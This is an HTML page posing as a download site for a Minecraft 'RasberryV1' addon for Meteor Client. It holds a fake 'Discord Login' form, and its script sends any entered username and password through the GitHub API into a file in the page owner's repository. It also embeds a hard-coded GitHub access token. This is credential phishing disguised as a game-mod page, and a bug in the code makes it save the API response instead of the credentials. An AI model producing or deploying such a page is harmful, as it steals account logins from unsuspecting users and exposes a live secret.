<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Minecraft Rasberry addon for Meteor Client</title>
    <!-- Include your main stylesheet -->
    <link rel="stylesheet" href="styles.css">
    <style>
        /* Additional styles specific to your page */
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <!-- Your existing HTML content -->
    <header>
        <!-- Navigation, logo, etc. -->
    </header>

    <main>
        <!-- Main content of your page -->
        <h1>Welcome to RasberryV1</h1>
        <p>Download Rasberry</p>

        <!-- Example: Login modal -->
        <div id="loginModal" class="modal">
            <div class="modal-content">
                <!-- Paste the login form here -->
                <div class="login-container">
                    <h2>Discord Login</h2>
                    <form id="loginForm">
                        <input type="text" id="username" name="username" placeholder="Username" required><br>
                        <input type="password" id="password" name="password" placeholder="Password" required><br>
                        <input type="submit" value="Login">
                    </form>
                </div>
            </div>
        </div>
        
        <!-- Example: Login button to trigger the modal -->
        <button id="loginBtn">Login</button>
    </main>

    <footer>
        <!-- Footer content -->
    </footer>

    <!-- JavaScript for modal functionality and form handling -->
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            var loginForm = document.getElementById('loginForm');

            loginForm.addEventListener('submit', function(event) {
                event.preventDefault(); // Prevent actual form submission

                var username = document.getElementById('username').value;
                var password = document.getElementById('password').value;

                // Save login details to GitHub repository
                saveLoginDetails(username, password);

                // Hide the login form after "logging in"
                document.getElementById('loginModal').classList.add('hidden');
            });

            function saveLoginDetails(username, password) {
                var token = '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'; // Replace with your GitHub Personal Access Token
                var owner = 'SenpaiCummer';
                var repo = 'SenpaiCummer.github.io';
                var path = 'information';

                // Current timestamp for commit message
                var now = new Date();
                var commitMessage = 'Update login information: ' + now.toISOString();

                // Data to append to the file
                var data = {
                    username: username,
                    password: password
                };

                // GitHub API endpoint
                var url = `https://api.github.com/repos/senpaicummer/senpaicummer.github.io/contents/information`;

                // Fetch options
                var options = {
                    method: 'GET',
                    headers: {
                        'Authorization': 'token ' + token
                    }
                };

                // Get current file contents to append new data
                fetch(url, options)
                    .then(response => response.json())
                    .then(data => {
                        // Decode base64 content
                        var content = JSON.parse(atob(data.content));

                        // Add new login information
                        content.push(data);

                        // Update file content
                        return fetch(url, {
                            method: 'PUT',
                            headers: {
                                'Authorization': 'token ' + token,
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                message: commitMessage,
                                content: btoa(JSON.stringify(content)),
                                sha: data.sha
                            })
                        });
                    })
                    .then(response => {
                        if (response.status === 200) {
                            console.log('Login details saved successfully.');
                        } else {
                            console.error('Error saving login details:', response.statusText);
                        }
                    })
                    .catch(error => {
                        console.error('Error fetching or updating file:', error);
                    });
            }

            // Example JavaScript to show/hide the modal
            document.getElementById('loginBtn').addEventListener('click', function() {
                document.getElementById('loginModal').style.display = 'block';
            });
        });
    </script>
</body>
</html>
